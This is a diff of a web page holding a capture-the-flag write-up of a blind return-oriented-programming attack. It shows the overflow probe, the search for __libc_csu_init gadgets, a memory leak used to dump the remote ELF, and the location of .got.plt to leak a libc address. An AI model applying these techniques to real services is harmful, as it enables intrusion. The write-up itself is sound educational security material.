@@ -102,13 +102,13 @@ The description of the challenge just gives us a hostname and a port</p>
 </blockquote>
 <h2 id="step-one--the-overflow">Step one : the overflow</h2>
 <p>To begin with this challenge, we start by interacting with the remote service. It simply asks for a input, thanks us, says bye and exits.</p>
-<pre><code class="language-nc" data-lang="nc">Hello you.
+<pre tabindex="0"><code class="language-nc" data-lang="nc">Hello you.
 What is your name ?
 &gt;&gt;&gt; bob
 Thanks bob
 Bye!
 </code></pre><p>However, if we were to send a bigger input, the program would not send any data back.</p>
-<pre><code class="language-nc" data-lang="nc">Hello you.
+<pre tabindex="0"><code class="language-nc" data-lang="nc">Hello you.
 What is your name ?
 &gt;&gt;&gt; aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
 
@@ -174,7 +174,7 @@ We will insert this gadget at the end of our ropchain, this way, if the &ldquo;m
 <p>Next, we will need to find a way to leak some data from the binary. And to do so, we must be able to control argument register, at least <code>rdi</code> and <code>rsi</code>, <code>rdx</code> would be a bonus if we need to call a function with 3+ arguments.</p>
 <p>There is a well-known gadget to controle <code>rdi</code> and <code>rsi</code> : it is located in the epilogue of <code>__libc_csu_init</code>
 From experience, I know the function ends like this :</p>
-<pre><code>5b             pop rbx
+<pre tabindex="0"><code>5b             pop rbx
 5d             pop rbp
 415c           pop r12
 415d           pop r13
@@ -245,7 +245,7 @@ stop_gadget = 0x400560
 		<span style="color:#00f">break</span>
 
 </code></pre></div><p>At the address <code>0x4004f5</code> we get the following data back :</p>
-<pre><code class="language-raw" data-lang="raw">Thanks aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaA\x07@\x7fELF\x02\x01\x01\nHello you.\nWhat is your name ?\n&gt;&gt;&gt;
+<pre tabindex="0"><code class="language-raw" data-lang="raw">Thanks aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaA\x07@\x7fELF\x02\x01\x01\nHello you.\nWhat is your name ?\n&gt;&gt;&gt;
 </code></pre><p>Great ! We have a way to leak data. This is most likely the adresse of a function that only takes a file descriptor and an address and sends data at the address back.
 How much data exactly ? By adjusting the address of the leaked data, we can observe that sometimes there is no data back, and there are no null bytes. We can infer that the program uses strlen or something similar to determine how much data is sent. So, if there is no data back, we can conclude that there is at least one null byte ! We can leak anything now !</p>
 <h3 id="leaking-the-binary">Leaking the binary</h3>
@@ -253,7 +253,7 @@ How much data exactly ? By adjusting the address of the leaked data, we can obse
 Let&rsquo;s try the easy way first : for that, with our arbitrary read, we will leak the values in the <code>.got.plt</code> section, and try to identify the libc using online database. For that, we need to locate the <code>.got.plt</code> section.</p>
 <p>The <code>.got.plt</code> can be quite far from the base of the ELF depending on the binary, so let&rsquo;s be efficient. For this, I have dumped the first 0x1000 starting at the base of the ELF.</p>
 <p>Here are the interesting parts :</p>
-<pre><code>00000370: 1010 6000 0000 0000 0800 0000 0000 0000  ..`.............                                                                         
+<pre tabindex="0"><code>00000370: 1010 6000 0000 0000 0800 0000 0000 0000  ..`.............                                                                         
 00000380: 006c 6962 632e 736f 2e36 0066 666c 7573  .libc.so.6.fflus                                                                         
 00000390: 6800 7075 7473 0070 7269 6e74 6600 7265  h.puts.printf.re                                                                         
 000003a0: 6164 0073 7464 6f75 7400 5f5f 6c69 6263  ad.stdout.__libc                                                                         
@@ -269,7 +269,7 @@ Let&rsquo;s try the easy way first : for that, with our arbitrary read, we will 
 00000540: ff25 a20a 2000 6804 0000 00e9 a0ff ffff  .%.. .h.........
 00000550: ff25 9a0a 2000 6805 0000 00e9 90ff ffff  .%.. .h.........
 </code></pre><p>What is this ? This is the <code>.plt</code> section : if we disassemble the 16 bytes at <code>0x400500</code> for instance, we get this :</p>
-<pre><code class="language-x86asm" data-lang="x86asm">ff25c20a2000       jmp    QWORD PTR [rip+0x200ac2]
+<pre tabindex="0"><code class="language-x86asm" data-lang="x86asm">ff25c20a2000       jmp    QWORD PTR [rip+0x200ac2]
 6800000000         push   0x0
 e9e0ffffff         jmp    0xfffffffffffffff0
 </code></pre><p>It indicates where the <code>.got.plt</code> section is. With this, we can leak the address in the libc of the puts function (there is one entry just before in the <code>.plt</code> - and puts is the second entry according to data at 0x380).
